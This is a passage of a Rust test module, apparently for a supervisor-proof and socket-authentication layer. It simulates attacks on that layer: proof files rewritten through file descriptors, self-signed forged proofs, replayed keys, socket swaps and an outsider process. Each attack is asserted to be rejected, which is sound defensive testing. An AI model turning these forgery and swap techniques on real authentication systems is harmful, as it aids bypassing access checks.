                        assert_eq!(unsafe { nix::libc::fchmod(fd, 0o400) }, 0);
                    }
                    isolated_test_proof().unwrap();
                    return;
                }
                #[cfg(not(target_os = "macos"))]
                {
                    use std::os::fd::FromRawFd as _;

                    let duplicate = unsafe { nix::libc::dup(9) };
                    assert!(duplicate >= 0);
                    let reader = unsafe { std::fs::File::from_raw_fd(duplicate) };
                    let original = read_proof_at(&reader).unwrap();
                    let mut forged = original.clone();
                    forged[0] = if forged[0] == b'a' { b'b' } else { b'a' };
                    assert_eq!(unsafe { nix::libc::fchmod(9, 0o600) }, 0);
                    let mut rewrite = std::fs::OpenOptions::new()
                        .write(true)
                        .truncate(true)
                        .open("/proc/self/fd/9")
                        .unwrap();
                    rewrite.write_all(&forged).unwrap();
                    rewrite.sync_all().unwrap();
                    drop(rewrite);
                    assert_eq!(unsafe { nix::libc::fchmod(9, 0o400) }, 0);
                    assert!(isolated_test_proof().is_err());

                    assert_eq!(unsafe { nix::libc::fchmod(9, 0o600) }, 0);
                    let mut restore = std::fs::OpenOptions::new()
                        .write(true)
                        .truncate(true)
                        .open("/proc/self/fd/9")
                        .unwrap();
                    restore.write_all(&original).unwrap();
                    restore.sync_all().unwrap();
                    drop(restore);
                    assert_eq!(unsafe { nix::libc::fchmod(9, 0o400) }, 0);
                    isolated_test_proof().unwrap();
                    return;
                }
            }
            if mode == "auth-key-replay" {
                let replayed_key = supervisor_verifying_key(valid.supervisor_pid)
                    .unwrap()
                    .to_bytes();
                let marker = valid.home.join("replayed-auth-key-consulted");
                let (validator, mut responder) = start_attacker_responder(replayed_key, &marker);
                assert_eq!(unsafe { nix::libc::dup2(validator.as_raw_fd(), 109) }, 109);
                let error = isolated_test_proof()
                    .err()
                    .expect("replayed auth key was accepted");
                assert!(
                    error
                        .to_string()
                        .contains("proof authentication peer is not the ancestor test supervisor"),
                    "genuine key replay reached the wrong rejection boundary: {error:#}"
                );
                stop_attacker_responder(&validator, &mut responder, &marker, &mode);
                assert!(
                    !marker.exists(),
                    "validator consumed a replayed key before authenticating its peer"
                );
                return;
            }
            let path = valid.home.join(format!("forged-proof-{mode}"));
            let mut writer = std::fs::OpenOptions::new()
                .create_new(true)
                .read(true)
                .write(true)
                .mode(0o600)
                .open(&path)
                .unwrap();
            if mode == "self" {
                eprintln!("hostile-proof-mode=self phase=forge-proof");
                let token = "self-issued";
                let executable = std::env::current_exe().unwrap().canonicalize().unwrap();
                let executable_metadata = std::fs::metadata(&executable).unwrap();
                let attacker_key = ed25519_dalek::SigningKey::generate(&mut rand::rngs::OsRng);
                let mut forged = Vec::new();
                writeln!(forged, "{token}").unwrap();
                writeln!(forged, "{}", valid.home.display()).unwrap();
                writeln!(forged, "{}", valid.root.display()).unwrap();
                writeln!(
                    forged,
                    "{}:{}",
                    valid.home_identity.0, valid.home_identity.1
                )
                .unwrap();
                writeln!(
                    forged,
                    "{}:{}",
                    valid.root_identity.0, valid.root_identity.1
                )
                .unwrap();
                writeln!(forged, "{}", valid.brain_addr).unwrap();
                writeln!(forged, "{}", valid.daemon_addr).unwrap();
                writeln!(forged, "{}", valid.password_digest).unwrap();
                writeln!(forged, "{}", valid.ipc_socket.display()).unwrap();
                writeln!(forged, "{}", valid.socket_root.display()).unwrap();
                writeln!(
                    forged,
                    "{}:{}",
                    valid.socket_root_identity.0, valid.socket_root_identity.1
                )
                .unwrap();
                writeln!(
                    forged,
                    "{}:{}",
                    valid.ipc_listener_identity.0, valid.ipc_listener_identity.1
                )
                .unwrap();
                writeln!(forged, "{}", std::process::id()).unwrap();
                writeln!(forged, "{}", executable.display()).unwrap();
                writeln!(
                    forged,
                    "{}:{}",
                    executable_metadata.dev(),
                    executable_metadata.ino()
                )
                .unwrap();
                // The proof must be rejected while authenticating the peer,
                // before any field in this attacker-signed body is trusted.
                // Hashing the Rust test executable here read hundreds of MB
                // only to populate an unreachable field and could consume the
                // hostile-mode deadline on a cold CI runner.
                writeln!(forged, "{}", "0".repeat(64)).unwrap();
                let signature = attacker_key.sign(&forged);
                writeln!(forged, "{}", hex::encode(signature.to_bytes())).unwrap();
                writer.write_all(&forged).unwrap();
                writer.sync_all().unwrap();
                writer
                    .set_permissions(std::fs::Permissions::from_mode(0o400))
                    .unwrap();
                drop(writer);
                let reader = std::fs::OpenOptions::new().read(true).open(&path).unwrap();
                std::fs::remove_file(&path).unwrap();
                assert_eq!(unsafe { nix::libc::dup2(reader.as_raw_fd(), 9) }, 9);
                assert_eq!(unsafe { nix::libc::dup2(reader.as_raw_fd(), 108) }, 108);
                std::env::set_var("FINCH_BRAIN_TEST_TOKEN", token);
                std::env::set_var("FINCH_TEST_SUPERVISOR_PID", std::process::id().to_string());
                let marker = valid.home.join("self-issued-auth-key-consulted");
                let (validator, mut responder) =
                    start_attacker_responder(attacker_key.verifying_key().to_bytes(), &marker);
                eprintln!(
                    "hostile-proof-mode=self phase=responder-started responder_pid={}",
                    responder.id()
                );
                assert_eq!(unsafe { nix::libc::dup2(validator.as_raw_fd(), 109) }, 109);
                eprintln!("hostile-proof-mode=self phase=validate-forged-proof");
                let error = isolated_test_proof()
                    .err()
                    .expect("signed self-issued proof was accepted");
                eprintln!("hostile-proof-mode=self phase=proof-rejected diagnostic={error:#}");
                assert!(
                    error
                        .to_string()
                        .contains("proof authentication peer is not the ancestor test supervisor"),
                    "signed self-issued proof reached the wrong rejection boundary: {error:#}"
                );
                assert!(
                    !marker.exists(),
                    "validator consumed an attacker key before authenticating its peer"
                );
                stop_attacker_responder(&validator, &mut responder, &marker, &mode);
                return;
            } else {
                std::fs::remove_file(&path).unwrap();
                assert_eq!(unsafe { nix::libc::dup2(writer.as_raw_fd(), 9) }, 9);
                assert_eq!(unsafe { nix::libc::dup2(writer.as_raw_fd(), 108) }, 108);
            }
            assert!(isolated_test_proof().is_err());
            return;
        }

        let timeout_outcome = run_hostile_proof_mode_with_deadline(
            "deadline-probe",
            std::time::Duration::from_millis(100),
        )
        .expect("hostile proof-mode deadline probe failed before reaching its timeout boundary");
        let HostileModeOutcome::TimedOut {
            diagnostic,
            cleanup_elapsed,
        } = timeout_outcome
        else {
            panic!("deadline-probe completed instead of exercising bounded timeout cleanup");
        };
        assert!(
            cleanup_elapsed < std::time::Duration::from_secs(3),
            "hostile proof-mode timeout cleanup exceeded its bounded grace; {diagnostic}"
        );

        let proof = isolated_test_proof().unwrap();
        let output = run_hostile_proof_mode("normal-exit-descendant")
            .expect("normal-exit descendant mode must be reclaimed");
        assert!(
            output.status.success(),
            "normal-exit descendant cleanup failed: status={} stdout={} stderr={}",
            output.status,
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        let descendant_pid: nix::libc::pid_t =
            std::fs::read_to_string(proof.home.join("normal-exit-descendant.pid"))
                .unwrap()
                .parse()
                .unwrap();
        assert_eq!(
            unsafe { nix::libc::kill(descendant_pid, 0) },
            -1,
            "normal-exit hostile proof descendant survived group cleanup"
        );
        assert_eq!(
            std::io::Error::last_os_error().raw_os_error(),
            Some(nix::libc::ESRCH)
        );

        for mode in [
            "self",
            "writable",
            "swapped-low-listener",
            "swapped-backup-listener",
            "swapped-low-ipc-listener",
            "swapped-backup-ipc-listener",
            "wrong-ipc-listener-identity",
            "rewrite-restore",
            "auth-key-replay",
            "missing-proof-backup",
            "mismatched-proof-backup",
            "clobbered-low-proof-is-restored",
            "stale-supervisor-pid",
        ] {
            let output = run_hostile_proof_mode(mode)
                .unwrap_or_else(|error| panic!("{mode} proof rejection subprocess: {error}"));
            assert!(
                output.status.success(),
                "{mode} proof rejection subprocess failed: status={} stdout={} stderr={}",
                output.status,
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    #[test]
    fn isolated_proof_validation_is_offset_independent_under_concurrency() {
        if !supervisor_contract_present() {
            return;
        }
        isolated_test_proof().unwrap();
        let barrier = std::sync::Arc::new(std::sync::Barrier::new(9));
        let workers = (0..8)
            .map(|_| {
                let barrier = std::sync::Arc::clone(&barrier);
                std::thread::spawn(move || {
                    barrier.wait();
                    for _ in 0..16 {
                        isolated_test_proof().unwrap();
                    }
                })
            })
            .collect::<Vec<_>>();
        barrier.wait();
        for worker in workers {
            worker.join().unwrap();
        }
    }

    #[test]
    fn isolated_socket_validation_accepts_owned_socket_by_descriptor() {
        if !supervisor_contract_present() {
            return;
        }
        let proof = isolated_test_proof().unwrap();
        let socket = proof.socket_root.join("accept.sock");
        let _listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
        validate_isolated_test_socket(&proof, &socket).unwrap();
    }

    #[test]
    fn isolated_socket_validation_rejects_default_socket_symlink() {
        if !supervisor_contract_present() {
            return;
        }
        let proof = isolated_test_proof().unwrap();
        let outside = proof.socket_root.join("outside.sock");
        let _listener = std::os::unix::net::UnixListener::bind(&outside).unwrap();
        let socket = proof.ipc_socket.clone();
        std::os::unix::fs::symlink(&outside, &socket).unwrap();
        assert!(validate_isolated_test_socket(&proof, &socket).is_err());
    }

    #[test]
    fn isolated_socket_validation_detects_identity_swap_across_connect_window() {
        if !supervisor_contract_present() {
            return;
        }
        let proof = isolated_test_proof().unwrap();
        let socket = proof.socket_root.join("swap.sock");
        let first = std::os::unix::net::UnixListener::bind(&socket).unwrap();
        let before = validate_isolated_test_socket(&proof, &socket).unwrap();
        drop(first);
        std::fs::remove_file(&socket).unwrap();
        let _replacement = std::os::unix::net::UnixListener::bind(&socket).unwrap();
        let after = validate_isolated_test_socket(&proof, &socket).unwrap();
        assert_ne!(before, after);
    }

    #[test]
    fn isolated_peer_authentication_rejects_connected_outside_process() {
        use std::os::unix::process::CommandExt as _;
        const SOCKET_ENV: &str = "FINCH_TEST_OUTSIDER_SOCKET";
        const READY_ENV: &str = "FINCH_TEST_OUTSIDER_READY";
        if !supervisor_contract_present() {
            return;
        }
        const ACCEPTED_ENV: &str = "FINCH_TEST_OUTSIDER_ACCEPTED";
        if let (Some(socket), Some(ready), Some(accepted)) = (
            std::env::var_os(SOCKET_ENV),
            std::env::var_os(READY_ENV),
            std::env::var_os(ACCEPTED_ENV),
        ) {
            let listener = std::os::unix::net::UnixListener::bind(socket).unwrap();
            std::fs::write(ready, b"ready").unwrap();
            let _connection = listener.accept().unwrap();
            std::fs::write(accepted, b"accepted").unwrap();
            std::thread::sleep(std::time::Duration::from_secs(30));
            return;
        }

        let proof = isolated_test_proof().unwrap();
        let socket = proof.socket_root.join("outsider.sock");
        let original_name = proof.socket_root.join("original.sock");
        let original_listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
        let before = validate_isolated_test_socket(&proof, &socket).unwrap();
        std::fs::rename(&socket, &original_name).unwrap();
        let ready = proof.home.join("outsider-ready");
        let accepted = proof.home.join("outsider-accepted");
        let mut outsider = std::process::Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "brain::isolation_tests::isolated_peer_authentication_rejects_connected_outside_process",
                "--nocapture",
            ])
            .env(SOCKET_ENV, &socket)
            .env(READY_ENV, &ready)
            .env(ACCEPTED_ENV, &accepted)
            .process_group(0)
            .spawn()
            .unwrap();
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while !ready.exists() {
            assert!(
                std::time::Instant::now() < deadline,
                "outsider did not bind"
            );
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let stream = runtime
            .block_on(tokio::net::UnixStream::connect(&socket))
            .unwrap();
        while !accepted.exists() {
            assert!(
                std::time::Instant::now() < deadline,
                "outsider did not accept"
            );
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        std::fs::remove_file(&socket).unwrap();
        std::fs::rename(&original_name, &socket).unwrap();
        let after = validate_isolated_test_socket(&proof, &socket).unwrap();
        assert_eq!(before, after, "fixture must reproduce an A-to-B-to-A swap");
        let result = authenticate_isolated_test_peer(&stream);
        assert!(result.is_err());
        drop(stream);
        drop(original_listener);
        outsider.kill().unwrap();
        outsider.wait().unwrap();
    }
}
